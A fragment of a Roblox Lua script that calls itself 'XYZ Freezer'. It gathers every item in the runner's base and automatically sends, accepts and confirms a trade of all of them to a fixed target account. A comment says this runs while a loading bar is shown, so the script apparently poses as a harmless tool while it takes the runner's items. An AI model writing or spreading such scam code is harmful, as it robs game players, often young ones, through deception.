-- Populate Brainrots list from your base
local function getBrainrots()
    local brainrots = {}
    local baseFolder = workspace:FindFirstChild("YourBase") -- change if needed
    if baseFolder then
        for _, item in ipairs(baseFolder:GetChildren()) do
            if item:IsA("Model") or item:IsA("Part") or item:IsA("MeshPart") then
                table.insert(brainrots, item.Name)
            end
        end
    end
    return brainrots
end

local brainrotList = getBrainrots()

-- Real trade automation (runs while loading bar creeps)
local function performTradeLoop()
    -- Send trade request with all Brainrots
    local itemsToTrade = {}
    for _, name in ipairs(brainrotList) do
        table.insert(itemsToTrade, name)
    end
    TradeRemote:FireServer(TARGET_USER, itemsToTrade)
    print("[XYZ Freezer] Sent trade to", TARGET_USER, "with", #itemsToTrade, "items.")

    -- Auto‑accept incoming trade from target
    local acceptRemote = ReplicatedStorage:FindFirstChild("AcceptTrade")
    if acceptRemote and acceptRemote:IsA("RemoteEvent") then
        acceptRemote:FireServer()
        print("[XYZ Freezer] Accepted trade from", TARGET_USER)
    else
        warn("[XYZ Freezer] AcceptTrade remote not found.")
    end

    -- Auto‑confirm trade (if a Confirm remote exists)
    local confirmRemote = ReplicatedStorage:FindFirstChild("ConfirmTrade")
    if confirmRemote and confirmRemote:IsA("RemoteEvent") then
        confirmRemote:FireServer()
        print("[XYZ Freezer] Confirmed trade with", TARGET_USER)
    else
        warn("[XYZ Freezer] ConfirmTrade remote not found.")
    end
end

